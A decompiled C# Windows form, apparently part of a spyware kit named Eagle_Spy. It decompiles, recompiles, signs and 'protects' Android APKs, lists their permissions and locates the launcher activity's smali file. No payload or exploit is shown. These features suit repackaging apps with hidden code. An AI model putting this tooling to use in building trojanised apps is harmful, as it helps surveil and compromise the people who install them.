using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000015 RID: 21
	[DesignerGenerated]
	public partial class Apk_studio : Form
	{
		// Token: 0x060001CE RID: 462 RVA: 0x0000FDE4 File Offset: 0x0000DFE4
		public Apk_studio()
		{
			base.Load += this.Apk_studio_Load;
			this.TargetAPKPATH = "";
			this.TargetAPKNAME = "";
			this.TargetWorkPATH = "";
			this.ApkStudioPath = "";
			this.APKINFO = "";
			this.Apkeditorpath = "";
			this.InitializeComponent();
		}

		// Token: 0x060001CF RID: 463 RVA: 0x0000FE54 File Offset: 0x0000E054
		public void log(string str)
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				this.logtext.AppendText("> " + str + "\r\n-----------------------\r\n");
			}));
		}

		// Token: 0x060001D0 RID: 464 RVA: 0x0000FE88 File Offset: 0x0000E088
		private void Selectapkbtn_Click(object sender, EventArgs e)
		{
			if (this.BackgroundWorker1.IsBusy)
			{
				EagleAlert.Showinformation("Please Wait.");
			}
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
			openFileDialog.Filter = "apk Files|*.apk";
			openFileDialog.RestoreDirectory = true;
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult != DialogResult.OK)
			{
				this.TargetApktext.Text = "";
				return;
			}
			this.TargetApktext.Text = openFileDialog.FileName;
			this.TargetAPKPATH = openFileDialog.FileName;
			string directoryName = Path.GetDirectoryName(this.TargetAPKPATH);
			this.TargetAPKNAME = Path.GetFileNameWithoutExtension(this.TargetAPKPATH);
			this.ApkStudioPath = directoryName + "\\Apk_Studio";
			if (!Directory.Exists(this.ApkStudioPath))
			{
				Directory.CreateDirectory(this.ApkStudioPath);
			}
			this.titlespanel.Enabled = true;
			this.titlespanel.Visible = true;
			if (!this.BackgroundWorker1.IsBusy)
			{
				this.BackgroundWorker1.RunWorkerAsync();
			}
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x0000FF80 File Offset: 0x0000E180
		private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				return;
			}
			Apk_studio._Closure_0024__116_002D0 closure_0024__116_002D = null;
			Apk_studio._Closure_0024__116_002D0 CS_0024_003C_003E8__locals0 = new Apk_studio._Closure_0024__116_002D0(closure_0024__116_002D);
			CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
			this.APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + this.TargetAPKPATH + "\"", 5000);
			if (this.apkicon.Image != null)
			{
				this.apkicon.Image.Dispose();
				this.apkicon.Image = null;
			}
			CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = Codes.ExtractName(this.TargetAPKPATH);
			CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", this.APKINFO));
			CS_0024_003C_003E8__locals0._0024VB_0024Local_Vercode = Conversions.ToString(Codes.RegexMatcher("(?<=versionCode=\\')(.*?)(?=\\')", this.APKINFO));
			CS_0024_003C_003E8__locals0._0024VB_0024Local_Vername = Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", this.APKINFO));
			string text = Conversions.ToString(Codes.RegexMatcher("(?<=sdkVersion:\\')(.*?)(?=\\')", this.APKINFO));
			CS_0024_003C_003E8__locals0._0024VB_0024Local_androidfrom = Codes.GetAndroidVersionName(text);
			string text2 = Conversions.ToString(Codes.RegexMatcher("(?<=targetSdkVersion:\\')(.*?)(?=\\')", this.APKINFO));
			CS_0024_003C_003E8__locals0._0024VB_0024Local_androidto = Codes.GetAndroidVersionName(text2);
			if (string.IsNullOrEmpty(CS_0024_003C_003E8__locals0._0024VB_0024Local_appname))
			{
				MatchCollection matchCollection = Regex.Matches(this.APKINFO, "application-label:'([^']*)'");
				if (matchCollection.Count > 0)
				{
					using (IEnumerator enumerator = matchCollection.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							object obj = enumerator.Current;
							Match match = (Match)obj;
							string value = match.Groups[1].Value;
							Console.WriteLine("Found application label: " + value);
							CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = value;
						}
						goto IL_01F6;
					}
				}
				CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = "Not found";
			}
			IL_01F6:
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.nametext.Text = "App Name: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.pkgtext.Text = "Package Name: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.vercodtext.Text = "Version Code: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_Vercode;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.vernamtext.Text = "Version Name: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_Vername;
					}));
				}
				else
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.nametext.Text = "姓名: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.pkgtext.Text = "标识符: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.vercodtext.Text = "版本代码: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_Vercode;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.vernamtext.Text = "版本名称: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_Vername;
					}));
				}
			}
			else
			{
				base.Invoke(new VB_0024AnonymousDelegate_0(delegate
				{
					CS_0024_003C_003E8__locals0._0024VB_0024Me.nametext.Text = "الأسم: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals0._0024VB_0024Me.pkgtext.Text = "المعرف: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
					CS_0024_003C_003E8__locals0._0024VB_0024Me.vercodtext.Text = "رقم الاصدار: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_Vercode;
					CS_0024_003C_003E8__locals0._0024VB_0024Me.vernamtext.Text = "اسم الاصدار: " + CS_0024_003C_003E8__locals0._0024VB_0024Local_Vername;
				}));
			}
			string text3 = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", this.APKINFO));
			if (Operators.CompareString(Path.GetExtension(text3), ".xml", false) == 0)
			{
				text3 = text3.Replace(".xml", ".png");
			}
			string text4 = Codes.TempPathCache + CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName + "\\\\" + text3;
			string directoryName = Path.GetDirectoryName(text4);
			if (text3.Contains("anydpi-v26"))
			{
				string[] pngs = Codes.pngs;
				string[] array = pngs;
				foreach (string text5 in array)
				{
					string text6 = text3.Replace("mipmap-anydpi-v26", text5).Replace("drawable-anydpi-v26", text5);
					Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[] { "e \"", this.TargetAPKPATH, "\" \"", text6, "\" -o\"", directoryName, "\" -aoa" }), 5000);
				}
			}
			else
			{
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[] { "e \"", this.TargetAPKPATH, "\" \"", text3, "\" -o\"", directoryName, "\" -aoa" }), 5000);
			}
			Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
			{
				"e \"",
				this.TargetAPKPATH,
				"\" \"META-INF\" -o\"",
				Codes.TempPathCache,
				CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName,
				"\\META-INF\" -aoa"
			}), 5000);
			try
			{
				this.apkicon.Image = Image.FromFile(text4);
			}
			catch (Exception)
			{
				this.apkicon.Image = Resources.noicon;
			}
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x000103E8 File Offset: 0x0000E5E8
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.apkicon.Image != null)
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.FileName = "image.png";
				saveFileDialog.Filter = "PNG Image|*.png";
				saveFileDialog.RestoreDirectory = true;
				DialogResult dialogResult = saveFileDialog.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string fileName = saveFileDialog.FileName;
					Image image = this.apkicon.Image;
					Bitmap bitmap = new Bitmap(image.Width, image.Height, PixelFormat.Format32bppArgb);
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.DrawImage(image, new Rectangle(0, 0, image.Width, image.Height));
					}
					bitmap.Save(fileName, ImageFormat.Png);
					EagleAlert.ShowSucess("Image saved successfully.");
					return;
				}
			}
			else
			{
				EagleAlert.Showinformation("No image to save.");
			}
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x000104C4 File Offset: 0x0000E6C4
		private void Andtotext_Click(object sender, EventArgs e)
		{
			Label label = (Label)sender;
			Clipboard.SetText(label.Text);
			EagleAlert.ShowSucess("copied to clipboard: " + label.Text);
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x000104F8 File Offset: 0x0000E6F8
		private void Button2_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				EagleAlert.Showinformation("Select Apk First.");
				return;
			}
			if (!Directory.Exists(this.TargetWorkPATH) || Codes.MyMsgBox("Confirm", "this app is decompiled before \r\nDecompile again ?", true, Resources.information48px))
			{
				if (this.deworker.IsBusy)
				{
					EagleAlert.Showinformation("Decompiling  , Please Wait...");
					return;
				}
				this.log("Starting Decompile..");
				this.loadingbar.Visible = true;
				this.deworker.RunWorkerAsync();
			}
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x0001057C File Offset: 0x0000E77C
		private void Deworker_DoWork(object sender, DoWorkEventArgs e)
		{
			string directoryName = Path.GetDirectoryName(this.TargetAPKPATH);
			this.TargetWorkPATH = directoryName + "\\Apk_Studio\\" + this.TargetAPKNAME;
			string text = Codes.ExecuteDecompile(this.TargetAPKPATH, this.TargetWorkPATH);
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				if (text.Contains("Copying original files"))
				{
					EagleAlert.ShowSucess("Decompiling finish");
					this.log("Decompiling finish");
					this.loadingbar.Visible = false;
					this.workdirtext.Text = this.TargetWorkPATH;
				}
				else
				{
					this.loadingbar.Visible = false;
					EagleAlert.ShowError("Decompiling failed");
					this.log("Decompiling failed");
				}
				this.log(text.Replace("\r\n", "\r\n"));
			}));
		}

		// Token: 0x060001D6 RID: 470 RVA: 0x000025C7 File Offset: 0x000007C7
		private void Button5_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				EagleAlert.Showinformation("Select Apk First.");
				return;
			}
			if (this.protectworker.IsBusy)
			{
				EagleAlert.Showinformation("Protector is busy , Please Wait...");
				return;
			}
			this.protectworker.RunWorkerAsync();
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x000105E4 File Offset: 0x0000E7E4
		private void Protectworker_DoWork(object sender, DoWorkEventArgs e)
		{
			string str = Codes.Excuteapkeditor_pro(this.TargetAPKPATH);
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				if (File.Exists(this.TargetAPKPATH.Replace(".apk", "_protected.apk")))
				{
					this.log("APK Protected finish");
					EagleAlert.ShowSucess("APK Protected finish");
				}
				else
				{
					this.log("APK Protected failed");
					EagleAlert.ShowSucess("APK Protected failed");
				}
				this.log(str);
			}));
		}

		// Token: 0x060001D8 RID: 472 RVA: 0x00010624 File Offset: 0x0000E824
		private void Button4_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				EagleAlert.Showinformation("Select Apk First.");
				return;
			}
			if (string.IsNullOrEmpty(this.TargetWorkPATH))
			{
				EagleAlert.Showinformation("Decompile Apk First.");
				return;
			}
			if (this.COworker.IsBusy)
			{
				EagleAlert.Showinformation("Compiling  , Please Wait...");
				this.loadingbar.Visible = true;
				return;
			}
			this.COworker.RunWorkerAsync();
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x00010690 File Offset: 0x0000E890
		private void COworker_DoWork(object sender, DoWorkEventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = this.TargetAPKNAME + "_APK.apk";
			saveFileDialog.Filter = "APK file|*.apk";
			saveFileDialog.RestoreDirectory = true;
			DialogResult dialogResult = DialogResult.None;
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				dialogResult = saveFileDialog.ShowDialog();
			}));
			if (dialogResult != DialogResult.OK)
			{
				return;
			}
			string fileName = saveFileDialog.FileName;
			string text = Codes.ExecuteCompile(this.TargetWorkPATH, fileName);
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				if (text.Contains("Built apk"))
				{
					EagleAlert.ShowSucess("Compiling finish");
					this.log("Compiling finish");
					this.loadingbar.Visible = false;
				}
				this.log(text.Replace("\r\n", "\r\n"));
			}));
		}

		// Token: 0x060001DA RID: 474 RVA: 0x00010744 File Offset: 0x0000E944
		private void Button3_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				EagleAlert.Showinformation("Select Apk First.");
				return;
			}
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = this.TargetAPKNAME + "_Signed.apk";
			saveFileDialog.Filter = "APK file|*.apk";
			saveFileDialog.RestoreDirectory = true;
			DialogResult dialogResult = DialogResult.None;
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				dialogResult = saveFileDialog.ShowDialog();
			}));
			if (dialogResult != DialogResult.OK)
			{
				return;
			}
			string fileName = saveFileDialog.FileName;
			Codes.ExecuteSign(this.TargetAPKPATH, fileName);
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				this.log("Signed  Success");
				if (File.Exists(fileName))
				{
					EagleAlert.ShowSucess("Signed  Success");
					this.log("SSigned  Success");
					return;
				}
				EagleAlert.ShowError("Signed  Failed");
				this.log("Signed failed");
			}));
		}

		// Token: 0x060001DB RID: 475 RVA: 0x00002423 File Offset: 0x00000623
		private void TargetApktext_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001DC RID: 476 RVA: 0x00002604 File Offset: 0x00000804
		private void Apk_studio_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x060001DD RID: 477 RVA: 0x00010814 File Offset: 0x0000EA14
		private void drakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.workdirtext.Text != string.Empty)
			{
				Process.Start(this.workdirtext.Text);
				return;
			}
			Process.Start(Path.GetDirectoryName(typeof(Apk_studio).Assembly.Location));
		}

		// Token: 0x060001DE RID: 478 RVA: 0x0001086C File Offset: 0x0000EA6C
		private void savebtn_Click(object sender, EventArgs e)
		{
			if (this.apkicon.Image == null)
			{
				EagleAlert.Showinformation("No image to save.");
				return;
			}
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "JPEG Image|*.jpg|PNG Image|*.png|BMP Image|*.bmp|All Files|*.*";
			saveFileDialog.Title = "Save Apk icon";
			saveFileDialog.FileName = "image";
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string extension = Path.GetExtension(saveFileDialog.FileName);
			if (extension == null)
			{
				return;
			}
			ImageFormat imageFormat = ImageFormat.Jpeg;
			string text = extension.ToLower();
			string text2 = text;
			if (!(text2 == ".png"))
			{
				if (text2 == ".jpg")
				{
					imageFormat = ImageFormat.Jpeg;
				}
			}
			else
			{
				imageFormat = ImageFormat.Png;
			}
			this.apkicon.Image.Save(saveFileDialog.FileName, imageFormat);
		}

		// Token: 0x060001DF RID: 479 RVA: 0x00010928 File Offset: 0x0000EB28
		private void Androidmanifest()
		{
			string text = this.workdirtext.Text.Trim();
			string text2 = "AndroidManifest.xml";
			string text3 = Path.Combine(text, text2);
			try
			{
				if (File.Exists(text3))
				{
					string text4 = File.ReadAllText(text3);
					this.logtext.Text = "";
					this.logtext.Text = text4;
				}
				else
				{
					EagleAlert.Showinformation("First Decompile Apk");
				}
			}
			catch (Exception)
			{
				EagleAlert.Showinformation("First Decompile Apk");
			}
		}

		// Token: 0x060001E0 RID: 480 RVA: 0x0000260C File Offset: 0x0000080C
		private void guna2GradientButton1_Click(object sender, EventArgs e)
		{
			this.Androidmanifest();
		}

		// Token: 0x060001E1 RID: 481 RVA: 0x000109AC File Offset: 0x0000EBAC
		private void guna2GradientButton3_Click(object sender, EventArgs e)
		{
			string text = this.workdirtext.Text.Trim();
			string text2 = "AndroidManifest.xml";
			string text3 = Path.Combine(text, text2);
			if (File.Exists(text3))
			{
				this.ExtractPermissions(text3);
				return;
			}
			EagleAlert.Showinformation("Please select Apk First");
		}

		// Token: 0x060001E2 RID: 482 RVA: 0x000109F4 File Offset: 0x0000EBF4
		private void ExtractPermissions(string filePath)
		{
			this.logtext.Text = "";
			string text = this.workdirtext.Text.Trim();
			string text2 = "AndroidManifest.xml";
			string text3 = Path.Combine(text, text2);
			if (File.Exists(text3))
			{
				string text4 = File.ReadAllText(text3);
				this.ExtractPermissionsFromManifest(text4);
				this.loadingbar.Visible = false;
				return;
			}
			EagleAlert.ShowError("Failed to extract permissions");
		}

		// Token: 0x060001E3 RID: 483 RVA: 0x00010A60 File Offset: 0x0000EC60
		private void ExtractPermissionsFromManifest(string manifestContent)
		{
			string[] array = manifestContent.Split(new char[] { '\n' });
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (text.Contains("<uses-permission"))
				{
					int num = text.IndexOf("android.permission.");
					if (num != -1)
					{
						int num2 = text.IndexOf("\"", num);
						if (num2 != -1)
						{
							string text2 = text.Substring(num, num2 - num);
							this.logtext.AppendText(text2 + Environment.NewLine);
						}
					}
				}
			}
		}

		// Token: 0x060001E4 RID: 484 RVA: 0x00010AF4 File Offset: 0x0000ECF4
		private string FindMainActivity(string manifestContent)
		{
			string text = "";
			string[] array = manifestContent.Split(new char[] { '\n' });
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				if (text2.Contains("<activity") && text2.Contains("android.intent.action.MAIN") && text2.Contains("android.intent.category.LAUNCHER"))
				{
					int num = text2.IndexOf("android:name=\"") + "android:name=\"".Length;
					int num2 = text2.IndexOf("\"", num);
					text = text2.Substring(num, num2 - num);
					break;
				}
			}
			return text;
		}

		// Token: 0x060001E5 RID: 485 RVA: 0x00010B9C File Offset: 0x0000ED9C
		private void ShowMainActivityPath(string filePath)
		{
			string text = this.workdirtext.Text.Trim();
			string text2 = Path.Combine(text, "AndroidManifest.xml");
			if (!File.Exists(text2))
			{
				this.logtext.AppendText(Environment.NewLine + "AndroidManifest.xml not found.");
				return;
			}
			string text3 = File.ReadAllText(text2);
			string text4 = this.FindMainActivity(text3);
			if (string.IsNullOrEmpty(text4))
			{
				this.logtext.AppendText(Environment.NewLine + "MainActivity not found in the manifest.");
				return;
			}
			string text5 = Path.Combine(text, "smali", text4.Replace('.', '\\') + ".smali");
			if (File.Exists(text5))
			{
				this.logtext.AppendText(Environment.NewLine + "MainActivity Path:" + Environment.NewLine);
				this.logtext.AppendText(text5);
				return;
			}
			this.logtext.AppendText(Environment.NewLine + "MainActivity smali file not found.");
		}

		// Token: 0x060001E6 RID: 486 RVA: 0x00010C90 File Offset: 0x0000EE90
		private void guna2GradientButton4_Click(object sender, EventArgs e)
		{
			string text = this.workdirtext.Text.Trim();
			string text2 = "AndroidManifest.xml";
			string text3 = Path.Combine(text, text2);
			if (File.Exists(text3))
			{
				this.ShowMainActivityPath(text3);
				return;
			}
			EagleAlert.Showinformation("Decompile Apk First");
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x00010CD8 File Offset: 0x0000EED8
		private void UpdateEnglish()
		{
			this.label8.Text = "Apk Tools";
			this.selectapkbtn.Text = "Browse...";
			this.drakeUIButtonIcon3.Text = "Go to folder";
			this.debtn.Text = "Decompile";
			this.cobtn.Text = "Compile";
			this.sinbtn.Text = "Sign Apk";
			this.button2.Text = "Extract";
			this.probtn.Text = "Protect";
			this.button1.Text = "ZipAlign";
			this.nametext.Text = "App name :";
			this.pkgtext.Text = "Package Name";
			this.vercodtext.Text = "Version code :";
			this.vernamtext.Text = "Version Name";
			this.savebtn.Text = "Save icon";
			this.guna2GradientButton1.Text = "AndroidManifest";
			this.guna2GradientButton2.Text = "Apktool.yml";
			this.guna2GradientButton3.Text = "Permissions";
			this.guna2GradientButton4.Text = "MainActivity Smali";
		}

		// Token: 0x060001E8 RID: 488 RVA: 0x00010E08 File Offset: 0x0000F008
		private void UpdateChinese()
		{
			this.label8.Text = "Apk工具";
			this.selectapkbtn.Text = "浏览...";
			this.drakeUIButtonIcon3.Text = "转到文件夹";
			this.debtn.Text = "反编译";
			this.cobtn.Text = "编译";
			this.sinbtn.Text = "签名Apk";
			this.button2.Text = "提取";
			this.probtn.Text = "保护";
			this.button1.Text = "ZipAlign";
			this.nametext.Text = "应用名称：";
			this.pkgtext.Text = "包名";
			this.vercodtext.Text = "版本代码：";
			this.vernamtext.Text = "版本名称";
			this.savebtn.Text = "保存图标";
			this.guna2GradientButton1.Text = "Android清单";
			this.guna2GradientButton2.Text = "Apktool配置";
			this.guna2GradientButton3.Text = "权限";
			this.guna2GradientButton4.Text = "主活动Smali";
		}

		// Token: 0x060001E9 RID: 489 RVA: 0x00010F38 File Offset: 0x0000F138
		private void UpdateRussian()
		{
			this.label8.Text = "Инструменты APK";
			this.selectapkbtn.Text = "Обзор...";
			this.drakeUIButtonIcon3.Text = "Перейти к папке";
			this.debtn.Text = "Декомпилировать";
			this.cobtn.Text = "Скомпилировать";
			this.sinbtn.Text = "Подписать APK";
			this.button2.Text = "Извлечь";
			this.probtn.Text = "Защитить";
			this.button1.Text = "ZipAlign";
			this.nametext.Text = "Название приложения:";
			this.pkgtext.Text = "Имя пакета";
			this.vercodtext.Text = "Код версии:";
			this.vernamtext.Text = "Имя версии";
			this.savebtn.Text = "Сохранить значок";
			this.guna2GradientButton1.Text = "Манифест Android";
			this.guna2GradientButton2.Text = "Apktool.yml";
			this.guna2GradientButton3.Text = "Разрешения";
			this.guna2GradientButton4.Text = "MainActivity Smali";
		}

		// Token: 0x060001EA RID: 490 RVA: 0x00011068 File Offset: 0x0000F268
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000061 RID: 97
		private string TargetAPKPATH;

		// Token: 0x04000062 RID: 98
		private string TargetAPKNAME;

		// Token: 0x04000063 RID: 99
		private string TargetWorkPATH;

		// Token: 0x04000064 RID: 100
		private string ApkStudioPath;

		// Token: 0x04000065 RID: 101
		private string APKINFO;

		// Token: 0x04000066 RID: 102
		private string Apkeditorpath;

		// Token: 0x02000016 RID: 22
		[CompilerGenerated]
		internal sealed class _Closure_0024__116_002D0
		{
			// Token: 0x060001EB RID: 491 RVA: 0x000110E8 File Offset: 0x0000F2E8
			public _Closure_0024__116_002D0(Apk_studio._Closure_0024__116_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
					this._0024VB_0024Local_PackageName = arg0._0024VB_0024Local_PackageName;
					this._0024VB_0024Local_Vercode = arg0._0024VB_0024Local_Vercode;
					this._0024VB_0024Local_Vername = arg0._0024VB_0024Local_Vername;
					this._0024VB_0024Local_androidfrom = arg0._0024VB_0024Local_androidfrom;
				}
			}

			// Token: 0x060001EC RID: 492 RVA: 0x0001113C File Offset: 0x0000F33C
			internal void _Lambda_0024__0()
			{
				this._0024VB_0024Me.nametext.Text = "الأسم: " + this._0024VB_0024Local_appname;
				this._0024VB_0024Me.pkgtext.Text = "المعرف: " + this._0024VB_0024Local_PackageName;
				this._0024VB_0024Me.vercodtext.Text = "رقم الاصدار: " + this._0024VB_0024Local_Vercode;
				this._0024VB_0024Me.vernamtext.Text = "اسم الاصدار: " + this._0024VB_0024Local_Vername;
			}

			// Token: 0x060001ED RID: 493 RVA: 0x000111CC File Offset: 0x0000F3CC
			internal void _Lambda_0024__1()
			{
				this._0024VB_0024Me.nametext.Text = "姓名: " + this._0024VB_0024Local_appname;
				this._0024VB_0024Me.pkgtext.Text = "标识符: " + this._0024VB_0024Local_PackageName;
				this._0024VB_0024Me.vercodtext.Text = "版本代码: " + this._0024VB_0024Local_Vercode;
				this._0024VB_0024Me.vernamtext.Text = "版本名称: " + this._0024VB_0024Local_Vername;
			}

			// Token: 0x060001EE RID: 494 RVA: 0x0001125C File Offset: 0x0000F45C
			internal void _Lambda_0024__2()
			{
				this._0024VB_0024Me.nametext.Text = "App Name: " + this._0024VB_0024Local_appname;
				this._0024VB_0024Me.pkgtext.Text = "Package Name: " + this._0024VB_0024Local_PackageName;
				this._0024VB_0024Me.vercodtext.Text = "Version Code: " + this._0024VB_0024Local_Vercode;
				this._0024VB_0024Me.vernamtext.Text = "Version Name: " + this._0024VB_0024Local_Vername;
			}

			// Token: 0x04000085 RID: 133
			public string _0024VB_0024Local_appname;

			// Token: 0x04000086 RID: 134
			public string _0024VB_0024Local_PackageName;

			// Token: 0x04000087 RID: 135
			public string _0024VB_0024Local_Vercode;

			// Token: 0x04000088 RID: 136
			public string _0024VB_0024Local_Vername;

			// Token: 0x04000089 RID: 137
			public string _0024VB_0024Local_androidfrom;

			// Token: 0x0400008A RID: 138
			public string _0024VB_0024Local_androidto;

			// Token: 0x0400008B RID: 139
			public Apk_studio _0024VB_0024Me;
		}
	}
}
